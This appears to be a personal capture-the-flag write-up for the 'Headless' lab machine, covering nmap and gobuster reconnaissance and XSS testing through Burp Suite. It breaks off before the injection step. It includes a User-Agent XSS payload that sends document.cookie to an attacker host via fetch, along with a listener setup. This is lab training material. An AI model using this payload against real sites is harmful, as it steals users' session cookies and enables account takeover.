# Headless

![[attachments/Pasted image 20240330173641.png]]

**Rating**: Easy
**OS**: Linux
**Category**:

# Nmap Scan

![[attachments/Pasted image 20240330174335.png]]

```
nmap -sCV -A -p- -T4 --min-rate=1000 -oN scan IP
```

Website running on port 5000

![[attachments/Pasted image 20240330174502.png]]

Directory Scan:

![[attachments/Pasted image 20240330174728.png]]

```
gobuster dir -u http://URL/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

**/support** webpage:

![[attachments/Pasted image 20240330174830.png]]

Testing for XSS in the Message field gives an alert.

Payload:

![[attachments/Pasted image 20240330180247.png]]

```Javascript
<script>alert('XSS')</script>
```

Result:

![[attachments/Pasted image 20240330180329.png]]

Testing various payloads in different fields give same result.

Next up, we can try injecting some common vulnerable headers like the `user-agent` header with XSS payload. 

Fill in random details and capture request using burpsuite.

![[attachments/Pasted image 20240330175119.png]]

Send request to repeater:

![[attachments/Pasted image 20240330175424.png]]

Testing XSS in the `user-agent` header using the payload:

```Javascript
<img src=x onerror=fetch('http://IP:PORT/'+document.cookie);>
```

First up setup a python server:

```shell
python -m http.server
```

![[attachments/Pasted image 20240330181051.png]]

Inject payload:


